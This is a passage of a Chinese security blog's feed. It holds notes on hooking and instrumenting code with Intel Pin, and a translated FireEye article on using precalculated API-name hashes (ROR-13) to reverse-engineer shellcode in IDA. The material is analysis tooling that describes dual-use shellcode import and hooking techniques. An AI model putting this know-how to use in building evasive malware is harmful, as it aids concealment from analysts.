class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">void Notification(ADDRINT val)</div><div class="line">&#123;</div><div class="line">    char buff[80];</div><div class="line"></div><div class="line">    if (!writeFun)</div><div class="line">    &#123;</div><div class="line">        fprintf(stderr, &quot;Write Function was not initialized ...\n&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sprintf(buff, &quot;Notification value: %p&quot;, Addrint2VoidStar(val));</div><div class="line">    writeFun(buff);</div><div class="line">&#125;</div><div class="line"></div><div class="line">VOID ImageLoad(IMG img, VOID *v)</div><div class="line">&#123;</div><div class="line">    const ANNOTATION *ann = 0;</div><div class="line">    USIZE num = 0;</div><div class="line"></div><div class="line">    printf(&quot;Processing %s\n&quot;, IMG_Name(img).c_str());</div><div class="line">    </div><div class="line">    for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec))</div><div class="line">    &#123;</div><div class="line">        if (SEC_Name(sec) == &quot;MyAnnot&quot;)</div><div class="line">        &#123;</div><div class="line">            ann = reinterpret_cast&lt;const ANNOTATION*&gt;(SEC_Data(sec));</div><div class="line">            num = SEC_Size(sec) / sizeof(ANNOTATION);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (ann)</div><div class="line">    &#123;</div><div class="line">        printf(&quot;Found annotations: \n&quot;);</div><div class="line">        for (UINT32 i = 0; i &lt; num; i++)</div><div class="line">        &#123;</div><div class="line">            ADDRINT addr = ann[i].addr + IMG_LoadOffset(img);</div><div class="line">            ADDRINT val = ann[i].value;</div><div class="line">            printf(&quot;\t%p %p\t&quot;, Addrint2VoidStar(addr), Addrint2VoidStar(val));</div><div class="line">            if (PIN_IsSafeForProbedInsertion(addr)) //检查addr对应指令是否可以做hook</div><div class="line">            &#123;</div><div class="line">                PIN_InsertCallProbed(addr, AFUNPTR(Notification), IARG_ADDRINT, val, IARG_END);</div><div class="line">                printf(&quot; - OK\n&quot;);</div><div class="line">            &#125;</div><div class="line">            else</div><div class="line">            &#123;</div><div class="line">                printf(&quot; - Failed\n&quot;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // Set the write line function, from the image of the annotations (i.e. the main executable).</div><div class="line">        RTN writeRtn = RTN_FindByName(img, &quot;write_line&quot;);</div><div class="line">        if (RTN_Valid(writeRtn))</div><div class="line">        &#123;</div><div class="line">            writeFun = (void (*)(char *))RTN_Funptr(writeRtn);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    printf(&quot;Completed %s\n&quot;, IMG_Name(img).c_str());</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h2 id="INS"><a href="#INS" class="headerlink" title="INS"></a>INS</h2><p>INS表示某地址对应的指令对象，通过INS_XXX函数可以获取指令对应汇编代码，可以判断指令时什么类型，也可以对INS进行插桩。</p> <blockquote> <p>An INS represents an instruction. Can only be accessed at instrumentation time.</p> </blockquote> <p>下面列出一部分函数，看名字就知道干什么的。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">string  LEVEL_CORE::INS_Disassemble (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsLea (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsNop (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsCall (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsProcedureCall (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsRet (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsSysret (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsSyscall (INS ins)</div><div class="line"></div><div class="line">ADDRINT  LEVEL_PINCLIENT::INS_Address (INS ins)</div><div class="line">USIZE  LEVEL_PINCLIENT::INS_Size (INS ins)</div><div class="line">RTN  LEVEL_PINCLIENT::INS_Rtn (INS x)</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsBranch (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsDirectBranch (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsDirectCall (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsDirectBranchOrCall (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsBranchOrCall (INS ins)</div><div class="line">BOOL  LEVEL_CORE::INS_IsIndirectBranchOrCall (INS ins)</div><div class="line"></div><div class="line">ADDRINT  LEVEL_PINCLIENT::INS_DirectBranchOrCallTargetAddress (INS ins)</div></pre></td></tr></table></figure> <p>下面主要对用到的几个函数，对其理解做一下笔记。</p> <h3 id="call-branch"><a href="#call-branch" class="headerlink" title="call/branch"></a>call/branch</h3><p>上面提到我要对call xxx中xxx的信息进行获取，就需要用到对INS的分析，进而通过插桩来获取地址。</p> <p>用到了下面几个函数对指令进行判断，是否是call。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">BOOL  LEVEL_CORE::INS_IsCall (INS ins)</div><div class="line">//call，不管目标是不是地址，或者寄存器等</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsBranch (INS ins) </div><div class="line">//jmp,jz,jnz等等，不管目标是不是地址，或者寄存器等</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsDirectBranch (INS ins)</div><div class="line">//jmp,jz,jnz等等，目标是地址</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsDirectCall (INS ins)</div><div class="line">//call xxx，目标是地址</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsDirectBranchOrCall (INS ins)</div><div class="line">//call,jmp,jz,jnz等等，目标是地址</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsBranchOrCall (INS ins)</div><div class="line">//call,jmp,jz,jnz等等，不管目标是不是地址，或者寄存器等</div><div class="line"></div><div class="line">BOOL  LEVEL_CORE::INS_IsIndirectBranchOrCall (INS ins)</div><div class="line">//call,jmp,jz,jnz等等，目标是寄存器</div></pre></td></tr></table></figure> <h3 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h3><p>如果INS满足INS_IsDirectBranchOrCall，可以直接通过<code>INS_DirectBranchOrCallTargetAddress</code>获取到目标地址。</p> <p>如果INS是<code>INS_IsIndirectBranchOrCall</code>，那么只有通过插桩来获取目标地址。插桩是必须使用<code>IPOINT_TAKEN_BRANCH</code>类型的action，然后再回调函数中可以通过寄存器来获取目标地址。</p> <p>如下所示代码：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">INS_InsertCall(ins, IPOINT_TAKEN_BRANCH, (AFUNPTR)RttiCall, IARG_CONTEXT, IARG_INST_PTR, IARG_END);</div><div class="line"></div><div class="line">void RttiCall(CONTEXT* ctx, ADDRINT addr)</div><div class="line">&#123;</div><div class="line">    ADDRINT TakenIP = (ADDRINT)PIN_GetContextReg(ctx, REG_INST_PTR);</div><div class="line"> ADDRINT RIP = (ADDRINT)PIN_GetContextReg(ctx, REG_RIP);</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过上面对RNT，INS使用的相关总结，已经可以拿到call xxx的目标地址，也可以对任意地址进行插桩（hook），但是就在JIT\Probe两个模式中找不到可以以结合的地方。</p> <ol> <li>JIT模式下，可以通过INS拿到目标地址，但是不能对目标地址进行插桩</li> <li>Probe模式下，可以对目标地址插桩，但是拿不到目标地址</li> </ol> <p>不知道pin是否可以满足这种需求，但在我目前看到的东西里，是没法实现了。</p> <p>如果有过路的高人，想可以指点一二，不甚感激。</p> <p>另外总结一下pin中各对象的关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IMG-&gt;SEC-&gt;BBL-&gt;RTN-&gt;INS</div></pre></td></tr></table></figure></p> <p>完结。</p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;相关：&lt;a href=&quot;https://software.intel.com/en-us/articles/pintool/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pin是什么&lt;/a&gt;  &lt;a href=&quot;https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pin可以做什么&lt;/a&gt;  &lt;a href=&quot;https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/index.html#EXAMPLES&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pin examples&lt;/a&gt;&lt;/p&gt; &lt;p&gt;此次使用pin目的，是为了能够应用pin在函数分析方面的功能，以及XXXInsertCall的功能&lt;/p&gt; &lt;p&gt;由于此前对pin了解不够深入，以为可以实现相应功能，哪知撞了南墙才知道pin也有些许局限。&lt;/p&gt; &lt;p&gt;下面将我对了解到的pin可以实现以及不能实现的各种坑写作笔记。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="pin" scheme="https://anhkgg.github.io/tags/pin/"/>            <category term="pintool" scheme="https://anhkgg.github.io/tags/pintool/"/>            <category term="function analysis" scheme="https://anhkgg.github.io/tags/function-analysis/"/>            <category term="hook" scheme="https://anhkgg.github.io/tags/hook/"/>            <category term="insertcall" scheme="https://anhkgg.github.io/tags/insertcall/"/>            <category term="instrument" scheme="https://anhkgg.github.io/tags/instrument/"/>            <category term="asm" scheme="https://anhkgg.github.io/tags/asm/"/>            <category term="插桩" scheme="https://anhkgg.github.io/tags/%E6%8F%92%E6%A1%A9/"/>            <category term="钩子" scheme="https://anhkgg.github.io/tags/%E9%92%A9%E5%AD%90/"/>            <category term="指令级" scheme="https://anhkgg.github.io/tags/%E6%8C%87%E4%BB%A4%E7%BA%A7/"/>        </entry>      <entry>     <title>使用预先算好的字符串hash逆向分析shellcode</title>     <link href="https://anhkgg.github.io/precalculated-string-hashes-reverse-engineering-shellcode/"/>     <id>https://anhkgg.github.io/precalculated-string-hashes-reverse-engineering-shellcode/</id>     <published>2016-07-11T10:29:16.000Z</published>     <updated>2016-07-11T10:38:41.611Z</updated>          <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对fireeye关于ida中shellcode_hashes_search_plugin.py的文章翻译，原文链接是<a href="https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html" target="_blank" rel="external">USING PRECALCULATED STRING HASHES WHEN REVERSE ENGINEERING SHELLCODE</a></p> <p>文章是fireeye的<a href="https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-jay-smith" target="_blank" rel="external">Jay Smith</a>写的，介绍说经常在分析恶意样本中遇到shellcode，文章会介绍shellcode导入技术的背景以及如何是IDA自动化标记来更快分析shellcode</p> <a id="more"></a> <h1 id="逆向shellcode"><a href="#逆向shellcode" class="headerlink" title="逆向shellcode"></a>逆向shellcode</h1><p>判断一段shellcode做了什么，最简单的方法是将其放在一个监控环境中运行。但是如果shellcode是被exploit加载并且你没有对应版本的可利用程序，这种方式就没什么用了。在我们研究shellcode的经验中，我们发现很多恶意样本含有一段嵌入的shellcode，样本将shellcode注入到其他进程中执行。然而，获取到这段嵌入的shellcode，让他运行起来，并不总是可用的。在这些情况下，就需要静态分析shellcode来看看它有些什么功能了。</p> <p>Shellcode的二进制文件一般都不是很大，所以逆向它们并不是很难，但是通常shellcode作者会使用一些技术手段来阻碍逆向分析。其中一种技术就是使用API函数名的hash来手工导入函数。</p> <h1 id="shellcode导入技术"><a href="#shellcode导入技术" class="headerlink" title="shellcode导入技术"></a>shellcode导入技术</h1><p>开发者编写正常的程序通常使用kernel32.dll的LoadLibraryA和GetProcAddress来加载任意DLL和获取它们的到处函数地址。而shllcode的作者经常遇到内存大小限制，所以如果在代码中使用API函数名的完整字符串是不大可能的。相对于使用完整函数名字符串，预先计算好函数名的hash值，保存到shellcode中，花费更少的内存大小。使用这种方式的话，shellcode就不能使用GetProcAddress来获取函数地址了，需要解析DLL的PE文件找到导出目录，解析到处函数数组。对每个函数名字，计算出它的hash值，对比先前保存在shellcode中的hash值，如果相等就找到了对应的API函数。关于这种技术的背景资料可以在Last Stage的<a href="http://lsd-pl.net/projects/winasm.zip" target="_blank" rel="external">winasm</a>项目中公开的paper中找到。</p> <p>这种技术听起来很难，但是幸运的是shellcode作者大都会重用已知的hash算法和值，这样逆向分析就更简单了。我所见过的大部分shellcode样本的hash算法都被metasploit收录了。这个算法如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">acc := 0</div><div class="line">for c in input_string do</div><div class="line">    acc := ROR(acc, 13);</div><div class="line">    acc := acc + c;</div><div class="line">end</div></pre></td></tr></table></figure> <p>这个肯定不是一个很强的hash算法，但是它已经完全可以达到将任意长度的输入字符串计算成一个整数的目的。这个算法唯一的限制是开发者使用的每一个API函数都有唯一的hash值，算法中简单的ROR-13是很有效的。我见过的不一样的hash算法通常只是将这个算法进行了轻微的修改：位移一个不同的值，将右移换成左移，或者使用其他方法将输入的所有字符串混合成一个整数值。</p> <h1 id="自动标记shellcode导入"><a href="#自动标记shellcode导入" class="headerlink" title="自动标记shellcode导入"></a>自动标记shellcode导入</h1><p>当你第一次逆向shellcode的时候，你通常可能在网上搜搜这些魔数，或者自己计算这些值保存在文本中以后使用。很长一段时间，我看了很多的样本，我意思到这是一个烦人且重复的工作，该使用IDA脚本进行自动化。</p> <p>由于shellcode作者重用通用的代码，我觉得公开我的IDA脚本集对恶意代码分析有帮助。预先用已知的hash算法计算出重用API函数名的hash后，如果有新的hash算法出现，就不难实现它来产生hash值了。在Poison Ivy RAT的字符串hash，有过这种情况（这句原文：There has only been one instance, involving string hash from Poison Ivy RAT, in which this wasn’t the case）。</p> <p>可以在<a href="https://github.com/mandiant/Reversing." target="_blank" rel="external">https://github.com/mandiant/Reversing</a>找到脚本。</p> <p>有两个部分：</p> <ol> <li><code>make_sc_hash_db.py</code> 是用于预先计算函数名字的hash值。这是一个实现了我以前遇到过的hash算法的命令行python脚本。它处理了一个目录中的所有DLL，计算了每个到处函数的hash值，保存在SQLite数据库中。</li> <li><code>shellcode_hash_search.py</code> 是一个IDAPython脚本，用来打开SQLite数据库，获取其中预先计算的hash值，在当前文件中搜索已知的hash值。</li> </ol> <p><code>make_sc_hash_db.py</code>可以像下面那样使用，第一个参数是要创建的数据库名字，第二个参数是保存DLL的目录。如果你跳过这个步骤，发布版本中已经有个简单的数据库了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python make_sc_hash_db.py sc_hashes.db /customer/microsoft/shellcode_dlls/</div></pre></td></tr></table></figure> <p>当<code>shellcode_hash_search.py</code>运行起来后，提示用户使用哪个数据库，然后询问用户其他的搜索参数。它显示所有的保存在数据库中的hash算法，然后提供一些简单的已知的伪代码，如图：</p> <p><img src="/img/Figure-3-QT-GUI-view-300x185.png" alt="Figure-3-QT-GUI-view-300x185"></p> <p>脚本会尝试使用HexRays发布的用于QT的PySide(可以在这里下载<a href="http://www.hex-rays.com/products/ida/support/download.shtml" target="_blank" rel="external">http://www.hex-rays.com/products/ida/support/download.shtml)</a>))。如果HexRays中没有PySide，它使用简单的对话框来或者相同的信息。</p> <p>如果没有任何信息被高亮，脚本搜索当前段或者高亮区域。脚本查询每个DWORD（选中了DWORD Array选项），每个指令操作数（选中了Instr Operands选项）来决定是不是选中算法的一个hash值。如果找到了一个hash值会有一个line comment。如图：</p> <p><img src="/img/Figure-4-Comments-are-added-for-identified-hashes-300x150.png" alt="Figure-4-Comments-are-added-for-identified-hashes-300x150.png"></p> <p>有些shellcode作者也经常使用hash值保存在DWORD数组中，而不是将每个值压入函数参数，如图：</p> <p><img src="/img/Figure-5-DWORD-array-of-hashes-300x149.png" alt="Figure-5-DWORD-array-of-hashes-300x149.png"></p> <p>如果选中了Create Struct，如果找到的hash值在一段连续地址，脚本会自动创建一个结构体，如图：</p> <p><img src="/img/Figure-6-Generated-structure-of-function-pointers-300x221.png" alt="Figure-6-Generated-structure-of-function-pointers-300x221.png"></p> <p>如果shellcode作者使用函数指针数组，结构体非常有用，它会转换成<code>[base+index]</code>的结构体引用。如图：</p> <p><img src="/img/Figure-7-Sample-function-pointer-array-usage-300x199.png" alt="Figure-7-Sample-function-pointer-array-usage-300x199 (1).png"></p> <p><code>shellcode_hashes_search_plugin.py</code>用来显示IDA插件菜单的。拷贝到<code>%PROGRAMFILES%IDAplugins</code>，设置其他python文件到PATH环境变量中确保可被使用。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通常，逆向分析一个shellcode比正常的binary文件更加乏味。IDA的导入表分析缺陷是一个延长分析的很大原因。通过IDAPython脚本可以解决上面的问题，我们已经将脚本公开在githun，希望你们的shellcode分析能够得到改进。</p> <p><strong>参考:</strong></p> <p><a href="https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html" target="_blank" rel="external">USING PRECALCULATED STRING HASHES WHEN REVERSE ENGINEERING SHELLCODE</a></p> <hr> <p>转载请注明出处，谢谢！</p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;对fireeye关于ida中shellcode_hashes_search_plugin.py的文章翻译，原文链接是&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;USING PRECALCULATED STRING HASHES WHEN REVERSE ENGINEERING SHELLCODE&lt;/a&gt;&lt;/p&gt; &lt;p&gt;文章是fireeye的&lt;a href=&quot;https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-jay-smith&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Jay Smith&lt;/a&gt;写的，介绍说经常在分析恶意样本中遇到shellcode，文章会介绍shellcode导入技术的背景以及如何是IDA自动化标记来更快分析shellcode&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="reverse" scheme="https://anhkgg.github.io/tags/reverse/"/>            <category term="shellcode" scheme="https://anhkgg.github.io/tags/shellcode/"/>            <category term="IDAPython" scheme="https://anhkgg.github.io/tags/IDAPython/"/>        </entry>    </feed> 